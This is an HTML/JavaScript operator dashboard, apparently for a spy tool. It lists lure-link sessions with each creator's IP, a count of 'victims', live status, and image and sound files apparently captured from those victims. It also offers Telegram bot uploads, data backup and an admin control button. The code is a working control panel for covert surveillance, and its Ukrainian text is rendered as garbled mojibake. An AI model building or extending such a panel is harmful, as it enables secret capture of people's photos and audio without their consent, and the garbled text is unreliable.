<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SPY MONITORING</title>
    <style>
        body { 
            background: #0a0a0a; color: #00ff99; 
            font-family: 'Courier New', monospace; 
            padding: 20px; margin: 0; 
        }
        .container { max-width: 1200px; margin: 0 auto; }
        
        h1 { 
            text-align: center; color: #00ff99; 
            text-shadow: 0 0 10px #00ff99; margin-bottom: 25px; letter-spacing: 2px;
        }

        /* --- TG BOT SECTION --- */
        .tg-container {
            background: #0d1318; border: 1px solid #0088cc; border-radius: 8px;
            padding: 15px; margin-bottom: 40px; box-shadow: 0 0 15px rgba(0, 136, 204, 0.1);
        }
        .tg-header { 
            display: flex; justify-content: space-between; align-items: center; 
            border-bottom: 1px solid #005580; padding-bottom: 10px; margin-bottom: 15px; 
        }
        .tg-title { 
            font-weight: bold; color: #00aaff; font-size: 18px; 
            display: flex; align-items: center; gap: 10px; 
        }
        .tg-grid { 
            display: grid; grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); gap: 12px; 
        }
        
        .tg-file-card {
            background: #151e26; border: 1px solid #004466; padding: 10px; border-radius: 6px;
            display: flex; flex-direction: column; gap: 8px; font-size: 11px; position: relative;
        }
        .tg-file-card:hover { border-color: #00aaff; box-shadow: 0 0 10px rgba(0,170,255,0.1); }
        
        .tg-meta { display: flex; justify-content: space-between; color: #888; font-size: 10px; }
        .tg-filename { color: #fff; font-weight: bold; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
        
        .tg-actions { display: flex; gap: 5px; margin-top: auto; }
        .tg-btn { 
            flex: 1; padding: 6px; border: none; border-radius: 4px; cursor: pointer; 
            font-weight: bold; font-size: 10px; transition: 0.2s;
        }
        .btn-copy { background: #0077aa; color: white; }
        .btn-copy:hover { background: #00aaff; }
        .btn-del { background: #331111; color: #ff5555; border: 1px solid #552222; }
        .btn-del:hover { background: #ff3333; color: white; }

        /* --- SESSIONS SECTION --- */
        .section-title { border-bottom: 1px solid #333; padding-bottom: 5px; margin-bottom: 15px; color: #aaa; font-size: 14px; }
        
        .sessions-grid { 
            display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 20px; 
        }
        .session-card { 
            background: #151515; border: 1px solid #333; border-radius: 8px; 
            padding: 15px; display: flex; flex-direction: column; gap: 5px;
            box-shadow: 0 0 5px rgba(0,0,0,0.5); 
        }
        .session-header { display: flex; justify-content: space-between; border-bottom: 1px solid #333; padding-bottom: 8px; margin-bottom: 5px; }
        .room-id { font-weight: bold; color: white; }
        .online-badge { background: #003300; color: #00ff99; padding: 2px 6px; border-radius: 4px; font-size: 10px; border: 1px solid #00ff99; }
        
        .info-row { font-size: 12px; color: #aaa; }
        .highlight { color: #00ff99; }

        .session-files { 
            margin-top: 10px; background: #0f0f0f; padding: 8px; border-radius: 5px; max-height: 100px; overflow-y: auto; 
        }
        .file-row { display: flex; justify-content: space-between; font-size: 11px; margin-bottom: 4px; border-bottom: 1px solid #222; padding-bottom: 2px; }
        
        .control-btn { 
            width: 100%; background: #00ff99; border: none; padding: 10px; margin-top: 10px; 
            cursor: pointer; font-weight: bold; border-radius: 5px; transition: 0.2s;
        }
        .control-btn:hover { background: #00cc7a; }
        .del-session-btn {
            width: 100%; background: #220000; color: #ff5555; border: 1px solid #550000;
            padding: 8px; margin-top: 5px; cursor: pointer; border-radius: 5px; font-size: 11px;
        }
        .del-session-btn:hover { background: #ff3333; color: white; }

        .no-data { text-align: center; color: #555; padding: 20px; border: 1px dashed #333; }
        
        /* Scrollbar */
        ::-webkit-scrollbar { width: 5px; }
        ::-webkit-scrollbar-track { background: #111; }
        ::-webkit-scrollbar-thumb { background: #333; border-radius: 3px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>üõ∞Ô∏è SPY DASHBOARD</h1>

        <div style="background: #111; padding: 15px; border: 1px dashed #555; margin-bottom: 25px; border-radius: 10px; display: flex; align-items: center; justify-content: space-between; gap: 15px;">
    <div style="flex: 1;">
        <h3 style="margin: 0; font-size: 14px; color: #ffcc00;">üíæ –°–ò–°–¢–ï–ú–ê –ü–ï–†–ï–ù–ï–°–ï–ù–ù–Ø –î–ê–ù–ò–•</h3>
        <p style="margin: 5px 0 0 0; font-size: 10px; color: #888;">–ó–±–µ—Ä—ñ–≥–∞–π—Ç–µ ZIP –ø–µ—Ä–µ–¥ –¥–µ–ø–ª–æ—î–º —Ç–∞ –∑–∞–≤–∞–Ω—Ç–∞–∂—É–π—Ç–µ –ø—ñ—Å–ª—è, —â–æ–± –Ω–µ –≤—Ç—Ä–∞—Ç–∏—Ç–∏ —Å–µ—Å—ñ—ó.</p>
    </div>
    
    <div style="display: flex; gap: 10px;">
        <a href="/backup-all" style="background: #0077aa; color: #fff; text-decoration: none; padding: 10px 15px; border-radius: 5px; font-size: 11px; font-weight: bold; border: 1px solid #00aaff;">
            üì• –°–ö–ê–ß–ê–¢–ò ZIP
        </a>

        <input type="file" id="restoreFile" style="display:none" accept=".zip" onchange="restoreData(this)">
        <button onclick="document.getElementById('restoreFile').click()" style="background: #222; color: #00ff99; border: 1px solid #00ff99; padding: 10px 15px; border-radius: 5px; font-size: 11px; font-weight: bold; cursor: pointer;">
            üì§ –í–Ü–î–ù–û–í–ò–¢–ò –ó ZIP
        </button>
    </div>
</div>

        <div class="tg-container">
            <div class="tg-header">
                <div class="tg-title">ü§ñ TELEGRAM UPLOADS</div>
                <a href="https://t.me/YOUR_BOT_USERNAME" target="_blank" style="color:#00aaff; text-decoration:none; font-size:12px;">[@–í–Ü–î–ö–†–ò–¢–ò –ë–û–¢–ê]</a>
            </div>
            <div id="tg-grid" class="tg-grid">Loading bot files...</div>
        </div>

        <div class="section-title">ACTIVE SESSIONS</div>
        <div id="grid" class="sessions-grid">Loading sessions...</div>
    </div>

    <script>
        async function load() {
            try {
                // –û—Ç—Ä–∏–º—É—î–º–æ –¥–∞–Ω—ñ –∑ –æ–Ω–æ–≤–ª–µ–Ω–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞
                const r = await fetch('/sessions');
                if(!r.ok) throw new Error("Server error");
                
                // –°–µ—Ä–≤–µ—Ä —Ç–µ–ø–µ—Ä –≤—ñ–¥–¥–∞—î –æ–±'—î–∫—Ç { sessions: [], botFiles: [] }
                const data = await r.json();
                
                renderBotFiles(data.botFiles);
                renderSessions(data.sessions);

            } catch(e) { 
                console.error(e); 
            }
        }

        async function restoreData(input) {
    if (!input.files[0]) return;
    if (!confirm("–¶–µ –≤–∏–¥–∞–ª–∏—Ç—å –ø–æ—Ç–æ—á–Ω—ñ –¥–∞–Ω—ñ —Ç–∞ –∑–∞–º—ñ–Ω–∏—Ç—å —ó—Ö –¥–∞–Ω–∏–º–∏ –∑ –∞—Ä—Ö—ñ–≤—É. –ü—Ä–æ–¥–æ–≤–∂–∏—Ç–∏?")) return;

    const fd = new FormData();
    fd.append('backup', input.files[0]);

    // –í—ñ–∑—É–∞–ª—å–Ω–∏–π —ñ–Ω–¥–∏–∫–∞—Ç–æ—Ä –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è
    input.disabled = true;
    
    try {
        const res = await fetch('/restore-all', {
            method: 'POST',
            body: fd
        });
        const result = await res.json();
        if (result.success) {
            alert("‚úÖ –î–∞–Ω—ñ –≤—ñ–¥–Ω–æ–≤–ª–µ–Ω–æ!");
            location.reload();
        } else {
            alert("‚ùå –ü–æ–º–∏–ª–∫–∞: " + result.error);
        }
    } catch (e) {
        alert("‚ùå –ü–æ–º–∏–ª–∫–∞ –∑'—î–¥–Ω–∞–Ω–Ω—è –∑ —Å–µ—Ä–≤–µ—Ä–æ–º");
    } finally {
        input.disabled = false;
        input.value = ""; // –°–∫–∏–¥–∞—î–º–æ –≤–∏–±—ñ—Ä —Ñ–∞–π–ª—É
    }
}

        // --- 1. RENDER BOT FILES ---
        function renderBotFiles(files) {
            const c = document.getElementById('tg-grid');
            
            if(!files || files.length === 0) {
                c.innerHTML = '<div style="grid-column:1/-1; text-align:center; color:#445;">–§–∞–π–ª—ñ–≤ –Ω–µ–º–∞—î. –ù–∞–¥—ñ—à–ª–∏ –∫–∞—Ä—Ç–∏–Ω–∫—É –∞–±–æ MP3 –±–æ—Ç—É!</div>';
                return;
            }
            
            c.innerHTML = files.map(f => `
                <div class="tg-file-card">
                    <div class="tg-meta">
                        <span>${f.type}</span>
                        <span>${f.uploadedAt}</span>
                    </div>
                    <div class="tg-filename" title="${f.filename}">${f.filename}</div>
                    <div class="tg-actions">
                        <button class="tg-btn btn-copy" onclick="copyUrl('${f.url}')">COPY LINK</button>
                        <button class="tg-btn btn-del" onclick="deleteBotFile('${f.filename}')">DEL</button>
                    </div>
                </div>
            `).join('');
        }

        // --- 2. RENDER SESSIONS ---
        function renderSessions(sessions) {
            const c = document.getElementById('grid');
            
            if(!sessions || sessions.length === 0) {
                c.innerHTML = '<div class="no-data">–ù–ï–ú–ê–Ñ –ê–ö–¢–ò–í–ù–ò–• –°–ï–°–Ü–ô</div>';
                return;
            }
            
            c.innerHTML = sessions.map(s => {
                const isActive = (Date.now() - s.lastActiveAt) < 60000;
                
                // –ó–±–∏—Ä–∞—î–º–æ —Ñ–∞–π–ª–∏ —Å–µ—Å—ñ—ó –≤ –∫—É–ø—É
                const sessionFiles = [
                    ...s.imagesFiles.map(f => ({...f, icon: 'üì∑'})),
                    ...s.soundsFiles.map(f => ({...f, icon: 'üîä'}))
                ].reverse();

                let filesHtml = '';
                if(sessionFiles.length > 0) {
                    filesHtml = `<div class="session-files">` + 
                    sessionFiles.map(f => `
                        <div class="file-row">
                            <span title="${f.originalname}">${f.icon} ${f.originalname.slice(0,20)}</span>
                            <a href="${f.url}" target="_blank" style="color:#00aaff;text-decoration:none;">‚¨á</a>
                        </div>
                    `).join('') + `</div>`;
                } else {
                    filesHtml = `<div style="font-size:10px; color:#555; margin-top:5px;">(–ë–µ–∑ —Ñ–∞–π–ª—ñ–≤)</div>`;
                }

                return `
                <div class="session-card">
                    <div class="session-header">
                        <span class="room-id">ID: ${s.id.slice(0,6)}..</span>
                        <span class="online-badge">ON: ${s.onlineCount}</span>
                    </div>
                    
                    <div class="info-row">Link: <a href="${s.fullUrl}" target="_blank" style="color:#00aaff">${s.shortCode || '...'}</a></div>
                    <div class="info-row">IP: ${s.creator.ip}</div>
                    <div class="info-row">–ñ–µ—Ä—Ç–≤: <span class="highlight">${s.totalVictims}</span></div>
                    <div class="info-row">–°—Ç–∞—Ç—É—Å: ${isActive ? '<span style="color:#00ff99">‚óè LIVE</span>' : '<span style="color:#555">‚óã SLEEP</span>'}</div>

                    ${filesHtml}

                    <div style="margin-top:auto;">
                        <button class="control-btn" onclick="openAdmin('${s.id}')">üëÅÔ∏è –ö–ï–†–£–í–ê–¢–ò</button>
                        <button class="del-session-btn" onclick="deleteSession('${s.id}', this)">‚úñ –í–ò–î–ê–õ–ò–¢–ò</button>
                    </div>
                </div>
                `;
            }).join('');
        }

        // --- ACTIONS ---
        function copyUrl(url) {
            const fullUrl = window.location.origin + url;
            navigator.clipboard.writeText(fullUrl).then(() => {
                alert('–ü–æ—Å–∏–ª–∞–Ω–Ω—è —Å–∫–æ–ø—ñ–π–æ–≤–∞–Ω–æ!');
            });
        }

        async function deleteBotFile(filename) {
            if(!confirm('–í–∏–¥–∞–ª–∏—Ç–∏ —Ü–µ–π —Ñ–∞–π–ª?')) return;
            try {
                await fetch(`/bot-file/${filename}`, { method: 'DELETE' });
                load(); // –û–Ω–æ–≤–ª—é—î–º–æ
            } catch(e) { alert('–ü–æ–º–∏–ª–∫–∞ –≤–∏–¥–∞–ª–µ–Ω–Ω—è'); }
        }

        async function deleteSession(id, btn) {
            if(!confirm('–í–∏–¥–∞–ª–∏—Ç–∏ —Å–µ—Å—ñ—é?')) return;
            btn.innerText = '...';
            try {
                await fetch(`/session/${id}`, { method: 'DELETE' });
                load();
            } catch(e) { alert('–ü–æ–º–∏–ª–∫–∞ –≤–∏–¥–∞–ª–µ–Ω–Ω—è'); }
        }

        function openAdmin(id) {
            prompt("–°–∫–æ–ø—ñ—é–π ID –¥–ª—è –≤—Ö–æ–¥—É –≤ –∞–¥–º—ñ–Ω–∫—É:", id);
            window.open('/admin.html', '_blank');
        }

        // –ê–≤—Ç–æ–æ–Ω–æ–≤–ª–µ–Ω–Ω—è –∫–æ–∂–Ω—ñ 3 —Å–µ–∫—É–Ω–¥–∏
        load();
        setInterval(load, 3000);
    </script>
</body>
</html>

